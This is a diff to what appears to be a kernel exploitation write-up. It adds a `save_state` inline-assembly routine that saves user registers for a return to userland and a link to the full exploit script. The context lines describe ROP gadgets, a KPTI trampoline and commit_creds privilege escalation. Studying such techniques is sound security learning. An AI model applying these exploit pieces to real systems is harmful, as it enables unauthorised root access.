@@ -131,6 +131,23 @@ void get_cred(void){
 + To get `offset` of `ksymtab_commit_creds`, we have used a gadget which is `mov rax, qword [rax+16] ; ret` and hence we pass `ksymtab_commit_creds-0x10`.
 + To return to a userland function, we first have to call our `kpti_trampoline`. This function initially has a lots of popping of registers and so we skip that with eyes closed.
 + Finally, we set `leak_cred` as our userland function and restore all the `EFLAGS` for smooth return to userland.
++ The `EFLAGS` are preserved by us by calling a special function before anything else, which is our `save_state` function which stores all the `EFLAGS` so that we can reuse them for returning to the userland.
+
+```c
+
+void save_state(){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_sp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        ".att_syntax;"
+    );
+    puts("[*] Saved state");
+}
+```
 
 ### get_creds
 
@@ -285,6 +302,8 @@ void priv_esc(){
 # Conclusion
 
 I had a great time learning about all the mitigations by enabling them one by one to understand them better.
+
+Full Script- [Here](https://gist.github.com/PwnVerse/717604fae0f1fcbc4afa6e9878860dce)
 
 ## References
 
